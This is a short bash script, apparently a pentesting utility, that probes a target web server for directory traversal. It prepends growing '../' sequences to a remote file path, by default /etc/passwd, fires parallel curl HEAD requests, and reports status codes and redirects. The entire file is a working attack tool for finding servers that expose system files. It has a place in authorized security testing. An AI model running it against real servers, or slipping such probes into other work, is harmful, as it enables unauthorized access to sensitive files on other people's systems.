#!/bin/bash

source _flags.sh

flag-set "-url" STRING "" "target url"
flag-set "-depth" INT "5" "file path depth"
flag-set "-rfile" STRING "/etc/passwd" "remote file to check"
flag-set "-range" BOOL "" "use range header"
flag-set "-help" BOOL "" "usage info"
RHOST=$(flag-get "-url" "$@")
DEPTH=$(flag-get "-depth" "$@")
RFILE=$(flag-get "-rfile" "$@")
CURLOPT=$(flag-rest "$@" )
if [ "yes" == "$( flag-get "-range" "$@" )" ]; then
	CURLOPT="$CURLOPT -H 'Range: bytes=0-4096'"
fi
if [ "yes" == "$( flag-get "-help" "$@" )" ] || [ -z "$RHOST" ]; then
	usage "... the rest will be passed to curl directly.\nURL parameter is mandatory"
	exit
fi

prefix=""
for i in $(seq 1 "$DEPTH"); do
	[ -z "$prefix" ] && cmd=$RFILE || cmd=${RFILE:1}
	(
		RHOST="${RHOST}/${prefix}${cmd}"
		res=$( curl -I $CURLOPT "$RHOST" 2>/dev/null )
		result=$( echo "$res" | grep '^HTTP' | tr -d '\n\r' )
		if $( echo "$result" | grep -q "30[1,2]" ); then
			location=$( echo "$res" | grep -i "location: " | tr -d '\n\r' )
			result="${result} | ${location}"
		fi
		[ -z "$result" ] || echo "${RHOST} | ${result}"
	)&
	prefix="${prefix}../"
done
wait
